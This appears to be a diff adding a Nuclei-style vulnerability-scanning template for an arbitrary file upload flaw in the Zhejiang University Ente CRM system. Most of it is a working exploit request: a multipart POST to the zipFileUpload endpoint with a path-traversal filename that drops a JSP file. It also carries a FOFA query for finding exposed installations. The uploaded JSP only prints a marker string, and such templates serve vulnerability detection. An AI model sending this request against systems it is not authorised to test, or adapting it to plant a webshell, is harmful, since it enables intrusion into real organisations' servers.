@@ -1,0 +1,62 @@
+id: poc-sxe7ki3nba2ggz2k
+info:
+  name: 浙大恩特客户资源管理系统 crmbasicaction 任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sxe7ki3nba2ggz2k'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sxe7ki3nba2ggz2k
+    fofa: title="欢迎使用浙大恩特客户资源管理系统" || body="script/Ent.base.js" || app="浙大恩特客户资源管理系统"
+http:
+- raw:
+  - 'POST /entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old HTTP/1.1
+
+
+    Accept-Encoding: gzip
+
+
+    Connection: close
+
+
+    Content-Type: multipart/form-data; boundary=0rwysvgvy7rxv790mpju
+
+
+
+
+    --0rwysvgvy7rxv790mpju
+
+
+    Content-Disposition: form-data; name="file"; filename="../../dudesuite.jsp"
+
+
+    Content-Type: application/zip
+
+
+
+
+    <% out.println("dudesuite"); %>
+
+
+    --0rwysvgvy7rxv790mpju--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    jsp
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
